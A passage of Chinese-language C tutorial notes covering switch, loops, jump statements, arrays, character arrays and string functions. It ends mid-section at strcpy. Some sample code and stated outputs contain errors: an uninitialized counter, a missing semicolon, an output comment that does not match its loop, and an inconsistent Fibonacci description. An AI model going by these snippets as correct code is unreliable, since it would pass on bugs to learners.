switch语句\n\n像上面的情况，如果一个程序有多个判断的时候，使用if语句的话会显得很繁琐，降低了代码的可读性和简洁性，这时候我们可以用switch语句\n\nswitch语句又被称为\"开关语句\"，它是一个多分支语句\n\n#### 单层switch\n\n基本格式\n\n```\nswitch(<表达式>)\n{\n\tcase <常量表达式1>:语句1;break;\n\tcase <常量表达式2>:语句2;break;\n\t/*这里的case语句是不限的，可以自己任意设置*/\n\tdefault : 语句n;\n}\n```\n\n需要说明的几种情况:\n\n- switch只能对常量值进行选择判断，意味着我们的表达式中的执行结果必须是整数类型或是能隐式转换成整数类型的表达式\n- 每个case标签是唯一的，不能有重复的case语句，且case只起到标签作用，不能作为判断\n- case标签的常量表达式可以是常量，也可以是返回常量的表达式，但不能是浮点数或字符串。\n- default语句是可选的，当没有任何case标签可以匹配上的时候则会执行default语句，如果没有default语句那么就会跳出switch语句\n- break语句也是可选的，**如果我们符合匹配的case语句后加了break的话，那么在执行完case语句后就会执行break语句跳出我们的switch语句，否则就会继续往下检索其他的case语句；直到遇到break为止**\n\n我们举个例子\n\n```c\n#include <stdio.h>\n//通过输入等级输出等级标语\nint main(){\n\tchar grade='A';\n\tprintf(\"输入等级以查看您的评判结果\\n\");\n\tscanf(\"%c\",&grade);\n\tif(grade>=97&&grade<=122){\n\t\tgrade-=32;\n\t} \n\tprintf(\"您的等级是%c\",grade);\n\tswitch(grade){\n\t\tcase 'A' : printf(\"大佬大佬\\n\");break;\n\t\tcase 'B' : printf(\"很可以了\\n\");break;\n\t\tcase 'C' : printf(\"不错不错\\n\");break;\n\t\tcase 'D' : printf(\"看得出来努力了\\n\");break;\n\t\tcase 'E' : printf(\"达到抖音人均水平了\\n\");break;\n\t\tdefault : printf(\"重修去吧老弟\\n\");break;\n\t}\n\treturn 0;\n}\n```\n\n当然一般考题都会结合break和switch嵌套去进行深入考察，这时候就需要对结构里面的语句进行逐步分析了\n\n#### switch嵌套\n\n*可以在一个* **switch** *语句内使用另一个* **switch** 语句。即使内部和外部 switch 的 case 常量包含共同的值，也没有矛盾。\n\n我们举个例子\n\n```c\n#include <stdio.h>\n//求a和b的值\nint main(){\n\tint x=1,y=0,a=0,b=0;\n\tswitch(x)\n\t{\n\t\tcase 1 : \n\t\tswitch(y)\n\t\t{\n\t\t\tcase 0 : a++;break;\n\t\t\tcase 1 : b++;break; \n\t\t}\n\t\tcase 2: a++;b++;break;\n\t\tcase 3: a++;b++;\n\t}\n\tprintf(\"a=%d,b=%d\\n\",a,b);\n\treturn 0;\n}\n//a=2，b=1\n```\n\n为什么是这个结果呢？当我们进入外层的switch语句时，会对x的值进行判断，并进入case 1的关于y的switch中，随后进入case 0并执行a++的语句，执行后遇到break跳出关于y的switch，由于外层switch的case 1没有break语句，所以按照我们上面讲的，它会继续向下检索，进入case 2并执行case 2的语句，直到遇到break跳出switch\n\n## 循环结构\n\n循环是由与循环体相关的一个条件表达式来控制的，*循环语句允许我们多次执行一个语句或语句组*\n\n循环结构又可以分成两类\n\n- 先判断循环(while语句和for语句):即进行循环体前先进行条件表达式的计算和判断，如果为真则进入循环且反复执行循环体直到表达式为假\n- 后判断循环(do...while语句):先执行一次循环体后再进行条件表达式的计算和判断，如果为真则进入循环且反复执行循环体直到表达式为假\n\n说的简单点就是后判断循环会比先判断循环多执行一次循环体，且是无条件执行\n\n### while语句\n\n只要给定的条件为真，C 语言中的 **while** 循环语句会重复执行一个目标语句。\n\n语法\n\n```\nwhile(<表达式>){\n\t循环体语句1\n}\n```\n\n- 语句1就是循环体，循环体可以是单条语句也可以是复合语句\n- 表达式可以是任意的表达式，当为任意非零值时都为 true。当条件为 true 时执行循环。 当条件为 false 时，退出循环，程序流将继续执行紧接着循环的下一条语句。\n\n![image-20250221192456205](../image/achieve/202411/C语言/image-20250221192456205.png)\n\n但是需要注意的是while循环语句有可能一次循环都不会执行，也就是当表达式返回值为0的时候，会跳过循环主体进行下一条语句\n\n我们试一下最简单的循环打印结果\n\n```c\n#include <stdio.h>\nint main(){\n\tint n=20;\n\twhile(n>0){\n\t\tprintf(\"n的值为%d\\n\",n);\n\t\tn--;\n\t}\n\treturn 0;\n} \n```\n\n![image-20250221192952704](../image/achieve/202411/C语言/image-20250221192952704.png)\n\n### do...while语句\n\n其实和while语句差不多，但是do...while语句至少会执行一次循环体，因为do...while语句把表达式放在循环体后面，这也意味着系统会先执行一次do里面的循环体再进行表达式的判断\n\n语法\n\n```\ndo{\n\t循环体语句1\n}while(<表达式>);\n```\n\n> [!IMPORTANT]\n>\n> 注意这里的while括号后是需要加分号的\n\n还是一样，我们搓代码\n\n```c\n#include <stdio.h>\nint main(){\n\tint n=20;\n\tdo{\n\t\tprintf(\"n的值为%d\\n\",n);\n\t}while(n=0);\n\treturn 0;\n} \n```\n\n![image-20250221193712457](../image/achieve/202411/C语言/image-20250221193712457.png)\n\n从这里可以看到，里面的表达式的结果是假，但是还是输出了循环体的语句\n\n### for语句\n\nfor循环不仅可以用于循环次数已经确定的情况，而且也可以用于循环次数不确定而只给出循环结束条件的情况，也就是说for循环可以精准的调控循环的情况\n\n语法\n\n```\nfor(<表达式1>;<表达式2>;<表达式3>){\n\t循环体语句\n}\n```\n\n- 表达式1一般为循环控制变量赋初值，所以又称为初值表达式，但是这是可选的，它不一定就是赋值表达式\n- 表达式2用于判定循环条件，故称为条件表达式\n- 表达式3一般用于循环变量的增减值，故称为增量表达式或步长值。从语法的角度来说这里可以是任何表达式\n\n执行过程\n\n1. 计算表达式1(注意:这个表达式在循环中只执行一次)\n2. 计算表达式2\n3. 如果表达式2为真则执行循环体语句\n4. 计算表达式3\n5. 然后返回表达式2进行判断，由此循环\n\n![image-20250221195241929](../image/achieve/202411/C语言/image-20250221195241929.png)     \n\n这里就可以看出来这个for循环的执行过程了\n\n接下来我们讲一下三种表达式省略后的情况\n\n- 当表达式1省略掉后，其后的分号是不能省略的，这时候我们需要在for循环之前给循环变量赋初值\n\n![image-20250221201545213](../image/achieve/202411/C语言/image-20250221201545213.png)\n\n- 如果表达式2省略掉后，循环条件永真，这个循环将无终止进入死循环\n\n![image-20250221201734112](../image/achieve/202411/C语言/image-20250221201734112.png)\n\n- 如果表达式3省略掉后，循环没有步长值，就会原地踏步异常停止\n- 如果表达式只有2存在，这个就等价于while循环\n\n另外我们也可以在这三个表达式中使用逗号进行额外的操作\n\n- 如果在表达式1中使用逗号表达式，则除了执行循环变量的赋初值外还会初始化其他变量\n\n例如\n\n```\nfor(i=1,j=10;i<10;i++)\n```\n\n- 如果在表达式2和表达式3中使用逗号表达式，那么表达式2和表达式3除了完成循环判断条件和循环变量的增减操作，还可以进行其他的数据处理\n\n例如\n\n```\nfor(i=1,j=10;i<10,x=i+j;i++,j--)\n```\n\n这些都是合法的\n\n另外我们还要讲几个无条件控制语句\n\n## 无条件控制语句\n\n### break语句\n\nbreak语句通常用在循环语句和开关语句中，break语句通常用于跳出循环或终止switch语句\n\n> [!NOTE]\n>\n> 1.只能用在循环语句和switch语句中，如果if语句中出现break，那么一定是if外层还有循环语句或者switch，这时候break跳出的是if语句外层的循环语句或switch语句\n>\n> 2.如果是在嵌套的循环语句或者switch语句中，那么break跳出的是它所在的内层的语句，这一层之外的外层语句将会继续执行\n\n语法:\n\n```\nbreak;\n```\n\n还是一样，我们搓代码\n\n![image-20250222141858250](../image/achieve/202411/C语言/image-20250222141858250.png)\n\n可以看到我们的if语句设定了当a=15的时候就会执行break，所以执行结果就是输出到15的时候就跳出，为了让大家更直观的看到是跳出的for循环，我再稍微改一下\n\n![image-20250222141818204](../image/achieve/202411/C语言/image-20250222141818204.png)\n\n做了一个小小的调整，就能很直观的看到当a等于15的时候满足if语句的条件并执行break跳出for循环，这里可以看到当执行break之后循环体的语句就不会执行了，这取决于break的顺序了\n\n### continue语句\n\ncontinue意思就是继续，和break不同的是，他只会跳过循环体的本次循环，而不会直接跳出循环语句，意味着程序在碰到continue的时候循环体后面的语句都不会执行，只会跳过当前循环中的代码，强迫开始下一次循环。\n\ncontinue只能在循环语句中使用，常与if语句结合去使用\n\n语法\n\n```\ncontinue;\n```\n\n需要注意的是\n\n- 在while语句中进行continue的时候，流程会直接跳到循环控制条件的布尔表达式重新进行判断执行\n- 在for语句中进行continue的时候，流程只是跳过当前循环体语句，而不会影响当前循环中表达式3的执行，当执行完表达式3后就会跳到表达式2继续下一次循环\n\n说那么多，实操一下就知道了\n\n在while中使用continue\n\n```c\n#include <stdio.h>\nint main(){\n\tint a=0;\n\twhile(a<10){\n\t\tif(a==5){\n\t\t\ta++;\n\t\t\tcontinue;\n\t\t}\n\t\tprintf(\"a=%d\\n\",a);\n\t\ta++;\n\t}\n\treturn 0;\n}\n/*\n执行结果:\na=0\na=1\na=2\na=3\na=4\na=6\na=7\na=8\na=9\n*/\n```\n\n这里跳过了a=5的时候的循环\n\n在for中使用continue\n\n```c\n#include <stdio.h>\nint main(){\n\tint a;\n\tfor(a=1;a<10;a++){\n\t\tif(a==5){\n\t\t\tcontinue;\n\t\t}\n\t\tprintf(\"a=%d\\n\",a);\n\t}\n\treturn 0;\n}\n/*\n执行结果:\na=0\na=1\na=2\na=3\na=4\na=6\na=7\na=8\na=9\n*/\n```\n\n### goto语句\n\n*C 语言中的* **goto** *语句允许把控制无条件转移到同一函数内的被标记的语句。*\n\n语法\n\n```\ngoto name;\n.\n..\n...\nname:\n```\n\n建议不要用goto语句，这样会显得代码看起来很杂乱无章\n\n## 问题:换硬币\n\n将一笔零钱换成5分、2分和1分的硬币，要求每种硬币至少有一枚，有几种不同的换法？\n\n- 输入格式:\n\n输入在一行中给出待换的零钱数额x∈(8,100)。\n\n- 输出格式:\n\n要求按5分、2分和1分硬币的数量依次从大到小的顺序，输出各种换法。每行输出一种换法，格式为：“fen5:5分硬币数量, fen2:2分硬币数量, fen1:1分硬币数量, total:硬币总数量”。最后一行输出“count = 换法个数”。\n\n这道题算是对循环方法的一个很经典的题目了，这里就是用传统的双重循环去解题的\n\n思路：\n\n1. 首先我们要知道一个总和公式：`total=fen5 * 5 + fen2 * 2 + fen1 * 1`，我们从每种币得最大值开始递减去组合，比如5分的币，最大值就是总价值`n-2-1/5`,就是5分出现数量最大值，依此类推两分和一分的，然后我们求和运算判断是否等于总价值`n`即可。\n\n贴代码\n\n```c\n#include <stdio.h>\n\nint main()\n{\n    int i, x, t, o, p, sum, amount;\n    scanf(\"%d\", &x);\n\n    for (i = (x - 2 - 1) / 5; i > 0; i--)\n\n    {\n        for (o = (x - 5 - 1) / 2; o > 0; o--)\n        {\n            p = x - (i * 5 + o * 2);\n            sum = i * 5 + o * 2 + p;\n\n            if (sum == x && p > 0){\n                amount++;\n                printf(\"fen5:%d, fen2:%d, fen1:%d, total:%d\\n\", i, o, p, i + o + p);\n            }\n        }\n    }\n    printf(\"count = %d\\n\", amount);\n\n    return 0;\n}\n```\n\n# 数组\n\n之前在数据类型中讲到构造类型的数组类型，到这里我们细致的讲解一下这个数组\n\n为什么需要数组呢？什么情况下需要用到数组呢？这是我们需要思考的问题，接下来我们看一个例子\n\n假如我们班上有五十个同学，每个同学的字母序号和年龄都不一样，这时候老师要求我们统计好同学的序号和年龄等信息并把它输出出来。那么我们需要怎么去进行呢？首先，我们需要先统计，把每个同学的序号记下来，把每个同学的年龄也记下来。这时候我们可以把字母序号和年龄分别写在两张纸上，假定序号是字符类型，我们难道需要一个个把同学的序号进行定义赋值吗，`char student1='A',student2='B'...`这样也太麻烦了，数量庞大的时候更是无从下手。这时候我们就需要用到数组去进行存放\n\n## 什么是数组\n\n数组就是一系列具有相同数据类型的相关数据的有序集合，例如班上所有学生的序号，班上所有学生的年龄等等，那我们用统一的名字来标识这个数组，这个标识符就是'数组名'\n\n- 数组元素就是数组中的数据元素，每一个数组元素通过下标不同而区分，在我们定义数组后，内存中会使用一段连续的存储空间去依次存放数组的数组元素\n\n![image-20250222151223506](../image/achieve/202411/C语言/image-20250222151223506.png)\n\n- 数组下标:每一个数组元素对应一个数组下标，数组下标即是数组元素位置的一个索引，下标从0开始递增。\n- 数组维数:根据维数可以把数组分成一维数组，二维数组，三维数组和多维数组，其`区别就是不同维数的数组的下标个数不一样`，例如一维数组的下标只有一个，而二维数组的下标有两个\n\n数组的声明并不是声明一个个单独的变量，而是声明一个数组变量，比如name[]，然后使用下标去对数组元素进行逐个赋值\n\n每个下标的数组元素的字节数就是当前数据类型对应的字节数，例如int a[2];那么a[0]和a[1]均占4个字节\n\n## 一维数组\n\n### 一维数组的定义\n\n格式\n\n```\n数据类型 数组名[整型常量表达式];\n例如 int a[3],b[10];\n```\n\n数组大小就是整型常量表达式，必须是整型常量或宏定义的符号常量，这里不能是变量，例如int n=10,a[n];这样的非法的\n\n数组的下标一定是从0开始的，且不能超过整型常量表达式规定的数组元素个数\n\n### 一维数组的初始化\n\n我们可以在定义数组的时候对数组进行初始化，具体的初始化方法有以下几种\n\n- 定义数组并对所有数组元素赋初值\n\n例如int a[5]={1,2,3,4,5};\n\n- 对数组的部分元素进行初始化\n\n例如int a[10]={1,2,3}\n\n此时其余没赋值的元素均为初始值0\n\n- 省略数组大小\n\n例如int a[]={1,2,3,4,5}\n\n这里表示数组的大小为5，但是切记当我们省略数组大小的时候需要对所有元素赋初值，这时候才能省略数组大小\n\n### 一维数组的访问\n\n当我们定义好数组后就可以对数组进行操作了，访问数组只能是对数组元素进行引用而不能是将数组作为整体去引用\n\n语法\n\n```\n数组名[访问数组元素下标]\n```\n\n当我们对数组元素进行操作的时候，通常可以将数组元素看成是普通变量去对待，这样看着会顺眼很多\n\n- `在引用数组元素的时候，下标可以是整型常量，已赋值的变量和含变量的表达式`\n\n我们接下来试一下\n\n```c\n#include <stdio.h>\nint main(){\n\tint a[3],i;\n//\tint a[]={1,2,3,4,5};//声明和初始化1\n//\tint a[5]={1,2,3,4,5};//声明和初始化2\n//\tint a[5]={1,2,3};//声明和初始化3 \n\ta[0]=1;\n\ta[1]=2;\n\ta[2]=3;\n\tfor(i=0;i<3;i++){\n\t\tprintf(\"a[%d]的值为%d\\n\",i,a[i]);\n\t}\n\treturn 0;\n}\n```\n\n这里采用了正常的声明和赋值。并把赋值结果输出。我们可以看到一般的一维数组都需要和一重循环进行挂钩使用\n\n## 获取数组的长度\n\n我们可以用sizeof运算符去获取数组的长度\n\n```c\n#include <stdio.h>\nint main(){\n\tint a[]={1,2,3,4,5};\n\tprintf(\"%d\",sizeof(a)/sizeof(a[0]));//用所有元素的字节数除去其中一个元素的字节数等于元素长度\n\treturn 0;\n} \n```\n\n另外我们要说的是，关于里面元素存储的地址\n\n## 关于数组名\n\n在C语言中，数组名就代表着数组的地址，即数组首元素的地址。当我们声明和定义一个数组的时候，该数组名就对应着这个数组的地址，例如我们举个例子\n\n```\nint a[3]={1,2,3};\n那么a和&a[0]等价\n```\n\n实操一下\n\n```c\n#include <stdio.h>\n\nint main() {\n    int a[] = {1, 2, 3, 4, 5};\n    int *c;  // 指向数组 a 的指针\n    int *b;      // 声明指针 b\n\tc = a;\n    b = &a[0];   // 将 b 指向数组 a 的第一个元素\n\n    printf(\"数组名的地址是：%p\\n\", (void*)c);  // 使用 %p 输出指针地址\n    printf(\"数组首元素的地址是：%p\\n\", (void*)b);  // 使用 %p 输出指针地址\n\n    return 0;\n}\n```\n\n这两个运行后的结果是一样的\n\n> [!IMPORTANT]\n>\n> 需要注意的是，虽然数组名表示数组的地址，但在大多数情况下，数组名会自动转换为指向数组首元素的指针。这意味着我们可以直接将数组名用于指针运算\n\n这里要讲几个特别重要的排序算法\n\n## 问题:冒泡排序\n\n冒泡排序（Bubble Sort）是一种简单的排序算法，就是通过重复的遍历需要排序的元素，比较相邻的元素并交换他们的位置来实现排序\n\n具体的实现步骤就是\n\n1. **比较相邻元素**：从列表的第一个元素开始，比较相邻的两个元素。\n2. **交换位置**：如果前一个元素比后一个元素大，则交换它们的位置。\n3. **重复遍历**：对列表中的每一对相邻元素重复上述步骤，直到列表的末尾。这样，最大的元素会被\"冒泡\"到列表的最后。\n4. **缩小范围**：忽略已经排序好的最后一个元素，重复上述步骤，直到整个列表排序完成。\n\n接下来我们写一下代码的实现\n\n```c\n#include <stdio.h>\nint main(){\n\tint a[100],i,k,n=0,z;\n\tfor(i=0;i<100;i++){\n\t\tprintf(\"请输入想要排序的整数\")\n\t\tscanf(\"%d\",&a[i]);\n\t\tif(a[i]==-1){\n\t\t\tbreak;//输入-1表示输入完毕退出循环 \n\t\t}\n\t\tn++;//计入有效元素 \n\t}\n\t//冒泡排序 \n\tfor(i=0;i<n-1;i++){\n\t\tfor(k=0;k<n-1-i;k++){\n\t\t\tif(a[k]>a[k+1]){\n\t\t\t\tz=a[k];\n\t\t\t\ta[k]=a[k+1];\n\t\t\t\ta[k+1]=z;\n\t\t\t}\n\t\t}\n\t}\n\t//输出排序后的 \n\tfor(i=0;i<n;i++){\n\t\tprintf(\"%d\\n\",a[i]);\n\t}\n}\n```\n\n这个写法只是在数组中的一个写法，后面学完了还会有更为方便的写法会讲解\n\n## 问题:求Fibonacci数列\n\nFibonacci数列又称斐波那契数列，又称黄金分割数列，指的是这样一个数列：0、1、1、2、3、5、8、13、21。\n\n也就是说这个数列的前两项都是1，且从第三项开始的每一项都等于前两项之和\n\nC代码实现过程\n\n```c\n#include <stdio.h>\nint main(){\n\tint f[100]={0,1},n=0,i;\n\tprintf(\"请输入你想要求的Fibonacci数列的长度\\n\");\n\tscanf(\"%d\",&n);\n\tfor(i=2;i<n;i++){\n\t\tf[i]=f[i-1]+f[i-2];\n\t}\n\t\n\tprintf(\"Fibonacci数列的前%d项就是:\\n\",n);\n\t\n\tfor(i=0;i<n;i++){\n\t\tprintf(\"%d \",f[i]);\n\t}\n    return 0;\n}\n```\n\n 继续看数组的知识点\n\n## 二维数组\n\n数组的下标有两个的数组就是二维数组，我们可以直接看成是行列构成的矩阵行列式，其中第一维下标就是表示行，第二维下标就是表示列，下标是从`[0][0]`开始的\n\n### 二维数组的定义\n\n格式\n\n```\n数据类型 数组名[整型常量表达式1][整型常量表达式2]\n例如 int a[3][4]\n```\n\n![image-20250222215203444](../image/achieve/202411/C语言/image-20250222215203444.png)\n\n- 二维数组两个下标之积就是二维数组的数据元素的个数\n- 一个二维数组可以看成若干个一维数组，即每行都可以是一个一维数组\n\n### 二维数组的初始化\n\n在定义二维数组的同时，我们同样可以对二维数组进行初始化操作，具体的方法如下:\n\n- 如果是所有元素赋值\n\n1. 按行给二维数组的元素赋值\n\n例如 `int a[2][4]={{1,2,3,4},{5,6,7,8}};`\n\n1. 不按行给二维数组的元素赋值\n\n例如`int a[2][4]={1,2,3,4,5,6,7,8};`这里的语句其实和上面是一样的\n\n1. 如果对所有元素赋初值，那么我们第一维的长度是可以省略的，第一维的长度会根据第二维的长度自动计算确定\n\n例如`int a[][4]={1,2,3,4,5,6,7,8}或int a[][4]={{1,2,3,4},{5,6,7,8}}`\n\n- 如果是对部分元素赋初值\n\n1. 按行对二维数组的元素赋值\n\n例如`int a[3][4]={{1,2},{4},{7}}`这里的话`a[0][0]=1,a[0][1]=2,a[1][0]=4,a[2][0]=7`其他的均为0\n\n1. 不按行对二维数组的元素赋值\n\n例如`int a[2][4]={1,2,3,4}`这里的话`a[0][0]=1,a[0][1]=2,a[0][2]=3,a[0][3]=4`，其他的均为0\n\n1. 按行对二维数组部分元素赋值，也可以省略第一维的长度\n\n例如`int a[][4]={{1,2},{3},{5}}`可以根据括号去判断出第一维的长度为3，同时其他的均为0\n\n### 二维数组的访问\n\n和一维数组一样，这里就不赘述了\n\n```\n数组名[下标1][下标2]\n```\n\n现在我们也讲一下关于二维数组的一些经典的题目\n\n## 打印杨辉三角\n\n首先我们先了解一下杨辉三角的特征\n\n- 最左边列和对角线上的数全为1\n- 第i行第j列的元素等于第i-1行第j列和第i-1行第j-1列两个元素的和\n\n具体就是以下\n\n```\n0 1 2 3 4 5 6 7 8 9 10\n0 1\n1 1 1\n2 1 2 1\n3 1 3 3 1\n4 1 4 6 4 1\n5 1 5 10 10 5 1\n6 1 6 15 20 15 6 1\n7 1 7 21 35 35 21 7 1\n```\n\n具体怎么通过代码去实现呢？\n\n```c\n#include <stdio.h>\nint main(){\n\t//杨辉三角前n行\n\tint a[100][100];\n\tint i,j,n;\n\tprintf(\"请输入你想求的杨辉三角的行数\\n\");\n    \n    \n\tscanf(\"%d\",&n);//输入想得到的杨辉三角的前n行 \n    \n\tfor(i=0;i<n;i++){\n\t\tfor(j=0;j<=i;j++){\n\t\t\tif(j==0||i==j){\n\t\t\t\ta[i][j]=1;\n\t\t\t}else{\n\t\t\t\ta[i][j]=a[i-1][j]+a[i-1][j-1];\n\t\t\t}\n\t\t}\n\t}\n    \n    \n\tfor(i=0;i<n;i++){\n\t\tfor(j=0;j<=i;j++){\n\t\t\tprintf(\"%3d\",a[i][j]);\n\t\t}\n\t\tputchar('\\n');\n\t} \n\treturn 0;\n}\n```\n\n![image-20250222235917282](../image/achieve/202411/C语言/image-20250222235917282.png)\n\n可以看到这里使用二维数组的时候都是结合二重for循环去使用的\n\n## 多维数组\n\n和前面的没区别，就不再赘述了\n\n当数组元素的下标的个数为2个或2个以上的时候，这类数组就是多维数组，我们的二维数组也是多维数组\n\n多维数组的定义格式\n\n```\n数据类型 数组名[整型常量表达式1][整型常量表达式2][整型常量表达式3][整型常量表达式4]...[整型常量表达式n]\n```\n\n## 字符数组\n\n之前我们有讲过字符串常量，字符串就是用双引号括起来的若干个有效字符的序列，字符串可以包含字母数字和转义字符等类型，那我们这时候就来看一下怎么用字符数组去定义一个字符串常量\n\n### 字符数组的定义\n\n之前有说过，在C语言中，系统会自动的在我们的字符串的最后加上一个空字符结尾字符`'\\0'`，那么这个字符也是需要占据一个字节空间的，所以我们在定义字符数组的时候长度上要有所改变，把空白字符算进去\n\n语法\n\n```\nchar 数组名字[整型常量表达式];//一维字符数组\nchar 数组名字[整型常量表达式1][整型常量表达式2]//二维字符数组\n例如我们的字符串''china'\nchar c[6]={'c','h','i','n','a','\\0'}\n长度要比字符串的长度多一\n```\n\n字符数组中的每个元素均占一个字节，且以ASCII码的形式存放\n\n> [!IMPORTANT]\n>\n> 关于数字字符和对应整数之间的转换\n>\n> 1. 数字字符到整数的转换:**使用字符的ASCII值**，可以将字符减去字符`'0'`的ASCII值来获得对应数字。例如`'数字'-'0'=数字`\n> 2. 整数到数字字符的转换:**使用字符的ASCII值**，可以将整数加上字符 `'0'` 的ASCII值来获得对应字符。例如`数字+'0'=字符`\n\n### 字符数组的初始化\n\n具体的初始化方法\n\n- 以字符常量的形式对字符数组初始化，例如`chr[3]={'y','o','u'};`\n\n- 以字符串常量的形式对字符数组进行初始化，例如`str[7]={\"string\"};`\n\n> [!IMPORTANT]\n>\n> 需要注意的是，在以字符串的形式初始化字符数组的时候，系统会自动在字符串的结尾加入结束符`'\\0'`，而以字符常量初始化的时候需要我们手动在结尾加上结束符，例如`chr[]={'s','t','r','i','n','g','\\0'};`这时候字符数组的长度也为7\n\n- 省略数组大小的初始化，当我们完整的给出所有元素值，则可以省略数组大小，例如:`char s1[]={'s','t','r','i','n','g'};`字符数组长度为6，因为系统没加上结束符，这也是为什么我们在以字符常量初始化的时候为什么要手动加上结束符，这样可以区分这是多个字符还是字符串\n- 二维字符数组初始化可以省略第一维的长度大小，例如`char a[][5]={\"s\",\"t\",\"r\"};`\n\n### 字符数组的输入和输出\n\n- 逐个字符的输入和输出(`%c`)\n\n格式\n\n```\nscanf(\"%c\",&字符数组元素);\nprintf(\"%c\",字符数组元素);\n```\n\n需要注意的是，在输入字符的时候，空格，回车都会保存进字符数组作为普通字符对待，所以需要格外注意字符数组的长度\n\n在对逐个字符进行输入结束后，系统不会自动在字符数组末尾加`\\0`，所以在输出的时候建议使用逐个字符输出，且字符输出的循环控制次数要由用户去控制\n\n试着写一下\n\n![image-20250223205922725](../image/achieve/202411/C语言/image-20250223205922725.png)\n\n这里可以看到在我们输入了多个字符后最后，最终读入的只有在数组长度内的字符，且没有结束符`\\0`\n\n- 字符串的输入和输出(`%s`)\n\n格式\n\n```\nscanf(\"%s\",&字符数组名字);\nprintf(\"%s\",字符数组名字);\n```\n\n这里需要注意的是，在输入字符串的时候，当遇到`空格`，`回车`，`tab`等字符就会结束输入，如果需要输入含有空格的字符串，我们可以用gets()函数\n\n在输入整个字符串后，系统会自动在字符数组末尾加上`\\0`结束符，当输出字符串时，字符串的结束由`\\0`控制，这个前面也讲过\n\n实操一下\n\n```c\n#include <stdio.h>\nint main(){\n\tchar a[]=\"wanth3f1ag\";\n\tint length=0;\n\tlength=sizeof(a)/sizeof(a[1]);\n\tprintf(\"字符数组的长度是%d\\n\",length);\n\tprintf(\"%s\",a);\n\treturn 0;\n}\n/*\n字符数组的长度是11\nwanth3f1ag\n*/\n```\n\n另外我们不能采用赋值语句将一个字符串之间赋值给数组\n\n## 字符串输入输出函数\n\n### gets()函数\n\n调用格式::\n\n```\ngets(str);\n```\n\n从键盘中输入一个字符串，且该字符串可以包含空格，直到遇到回车时会终止，并将字符串存放在由str指定的字符数组中\n\n参数str:str为存放字符串的字符数组的首地址，也就是我们的字符数组名\n\n也是试着写一下\n\n```c\n#include <stdio.h>\nint main(){\n\tchar a[10];\n\tprintf(\"请输入字符串\\n\"); \n\tgets(a); \n\tprintf(\"%s\",a);\n\treturn 0;\n}\n```\n\n![image-20250223210638405](../image/achieve/202411/C语言/image-20250223210638405.png)\n\n但是gets()函数不会限制输入的字符串的长度，这会导致缓冲区溢出\n\n### 扩展:缓冲区溢出\n\n(如果用户输入的字符数超过 `a` 数组的大小（在此例中为 10），`gets()` 函数会继续将字符写入数组之外的内存区域。这种行为称为缓冲区溢出，超出数组边界的字符覆盖了程序的其他内存内容，可能导致数据损坏或程序逻辑错误。)\n\n由于 `gets()` 函数存在上述问题，C 标准库在 C11 标准中已被弃用。推荐使用 `fgets()` 函数\n\n### fgets()函数\n\n语法\n\n```\nchar *fgets(char *str, int num, FILE *stream);\n```\n\n参数讲解\n\n- `char *str`：指向存储读取字符串的字符数组（缓冲区）。\n- `int num`：要读取的最大字符数（包括终止字符 `\\0`）。\n- `FILE *stream`：输入流，一般使用 `stdin` 表示标准输入。\n\n所以我们上面的例子可以改成\n\n```c\n#include <stdio.h>\nint main(){\n\tchar a[10];\n\tprintf(\"请输入字符串\\n\"); \n\tfgets(a,sizeof(a),stdin); \n\tprintf(\"%s\",a);\n\treturn 0;\n}\n```\n\n![image-20250223211305038](../image/achieve/202411/C语言/image-20250223211305038.png)\n\n`fgets()` 会把换行符 `\\n` 包含在读取的字符串中，如果需要去掉换行符，可以手动处理，例如\n\n```\na[strcspn(buffer, \"\\n\")] = '\\0'; // 去掉换行符\n```\n\n- `fgets()` 在达到指定字符数之前也会在遇到 EOF 时停止读取，但如果在读取的字符中遇到换行符，它会立即停止并将换行符也包含在返回的字符串中。\n\n### puts()函数\n\n调用格式:\n\n```c\nputs(str);\n```\n\n从str指定的地址开始，依次将存储单元中的字符串输出到终端显示器，直到遇到字符串结束符为止\n\n- puts在打印字符串结束后会自动换行，因为他会自动把结束符换成换行符\n\n试一下\n\n```c\n#include <stdio.h>\nint main(){\n\tchar a[10];\n\tprintf(\"请输入字符串\\n\"); \n\tfgets(a,sizeof(a),stdin); \n\tputs(a);\n\treturn 0;\n}/*请输入字符串\nsfwfsaf\\0dwdasda\nsfwfsaf\\0\n*/\n```\n\n注意这里如果我们主动输入结束符的话，结束符是会被当成正常字符去处理的\n\n接下来我们讲几个字符串处理函数\n\n## 字符串处理函数\n\n在使用字符串处理函数的时候需要包含string.h头文件\n\n| 序号 | 函数 & 目的                                                  |\n| :--- | :----------------------------------------------------------- |\n| 1    | **strcpy(s1, s2);** 复制字符串 s2 到字符串 s1。              |\n| 2    | **strcat(s1, s2);** 连接字符串 s2 到字符串 s1 的末尾。       |\n| 3    | **strlen(s1);** 返回字符串 s1 的长度。                       |\n| 4    | **strcmp(s1, s2);** 如果 s1 和 s2 是相同的，则返回 0；如果 s1<s2 则返回小于 0；如果 s1>s2 则返回大于 0。 |\n| 5    | **strchr(s1, ch);** 返回一个指针，指向字符串 s1 中字符 ch 的第一次出现的位置。 |\n| 6    | **strstr(s1, s2);** 返回一个指针，指向字符串 s1 中字符串 s2 的第一次出现的位置。 |\n\n### strlen(str1)长度函数\n\n功能:统计str为起始地址的字符数组或字符串常量的实际长度(其中包括转义字符但不包括串结束符`\\0`),返回值为其长度\n\n函数只返回第一个结束符之前的字符串长度，例如`strlen(\"abc\\0abc\\0a\"))`的返回值是3，但是如果遇到八进制转义字符例如`\\012`的话就会按八进制转义字符去算。\n\n举个例子\n\n```c\n#include <stdio.h>\n#include <string.h>\nint main(){\n\tchar str1[]=\"abc\\0bc\\0c\";\n\tchar str2[]=\"abc\\012\\\\\\n\";\n\tprintf(\"str1的字符串长度为%d\\n\",strlen(str1));\n\tprintf(\"str2的字符串长度为%d\\n\",strlen(str2));\n\treturn 0;\n}\n/*\nstr1的字符串长度为3\nstr2的字符串长度为6\n*/\n```\n\n### strcat(s1, s2)连接函数\n\n功能:将str2为首地址的字符串连接到str1串的后面，且从str1串的`\\0`所在位置起开始连接，这意味着如果结尾符在中间的话，str2会拼接在结尾符后面并自动覆盖结尾符和之后的字符串\n\n参数str1必须是字符数组名，参数str2既可以为字符数组名，指向字符数组的指针，也可以是字符串常量\n\n需要注意的是，str串的字符数组必须有足够的空间可以连接str2字符串，否则会导致超界现象\n\n举个例子\n\n```c\n#include <stdio.h>\n#include <string.h>\nint main(){\n\tchar str1[100]=\"abc\\0bc\";\n\tchar str2[]=\"wan\";\n\tprintf(\"%s\",strcat(str1,str2));\n\treturn 0;\n}\n/*\nabcwan\n*/\n```\n\n### strcpy(s1, 